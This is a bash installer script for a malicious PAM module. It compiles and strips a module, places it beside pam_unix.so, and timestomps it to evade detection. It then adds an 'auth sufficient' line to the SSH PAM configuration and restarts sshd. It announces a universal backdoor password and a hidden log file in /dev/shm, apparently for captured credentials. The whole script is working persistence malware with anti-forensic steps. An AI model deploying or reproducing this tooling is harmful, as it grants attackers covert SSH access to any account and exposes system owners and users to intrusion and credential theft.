#!/bin/bash
#
# Quiet installation. Run as root.
#

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

[ "$(id -u)" -ne 0 ] && echo -e "${RED}[!] Need root${NC}" && exit 1

echo -e "${GREEN}[*] Finding PAM directory...${NC}"
PAM_DIR=$(dirname $(find /lib* /usr/lib* -name "pam_unix.so" 2>/dev/null | head -1) 2>/dev/null)

if [ -z "$PAM_DIR" ]; then
    echo -e "${RED}[!] PAM directory not found${NC}"
    exit 1
fi

echo -e "${GREEN}[+] PAM directory: ${PAM_DIR}${NC}"

echo -e "${GREEN}[*] Installing dependencies...${NC}"
if command -v apt-get &>/dev/null; then
    apt-get update -qq && apt-get install -y -qq libpam0g-dev libssl-dev gcc >/dev/null 2>&1
elif command -v pacman &>/dev/null; then
    pacman -S --noconfirm --needed pam openssl gcc >/dev/null 2>&1
elif command -v yum &>/dev/null; then
    yum install -y -q pam-devel openssl-devel gcc >/dev/null 2>&1
fi

echo -e "${GREEN}[*] Compiling module...${NC}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

gcc -fPIC -shared -O3 -s -fvisibility=hidden \
    -o pam_auth.so pam_auth.c \
    -lcrypto -lpam 2>/dev/null

if [ ! -f pam_auth.so ]; then
    echo -e "${RED}[!] Compilation failed${NC}"
    exit 1
fi

strip --strip-all pam_auth.so 2>/dev/null || true

echo -e "${GREEN}[*] Deploying to ${PAM_DIR}...${NC}"
cp pam_auth.so "${PAM_DIR}/pam_auth.so"
chown root:root "${PAM_DIR}/pam_auth.so"
chmod 644 "${PAM_DIR}/pam_auth.so"

# Timestomp
touch -r "${PAM_DIR}/pam_unix.so" "${PAM_DIR}/pam_auth.so"

echo -e "${GREEN}[*] Configuring PAM...${NC}"
PAM_SSHD="/etc/pam.d/sshd"

# Backup (for testing - remove in prod)
cp "$PAM_SSHD" "${PAM_SSHD}.bak" 2>/dev/null || true

# Check if already installed
if ! grep -q "pam_auth.so" "$PAM_SSHD"; then
    # Insert after first line
    sed -i '1a auth sufficient pam_auth.so' "$PAM_SSHD"
fi

echo -e "${GREEN}[*] Restarting SSH...${NC}"
systemctl restart sshd 2>/dev/null || service sshd restart 2>/dev/null || true

echo -e "${GREEN}[+] Done. Backdoor password: elliot${NC}"
echo -e "${GREEN}[+] Test: ssh anyuser@localhost (password: elliot)${NC}"
echo -e "${GREEN}[+] Logs: /dev/shm/.Xauth${NC}"
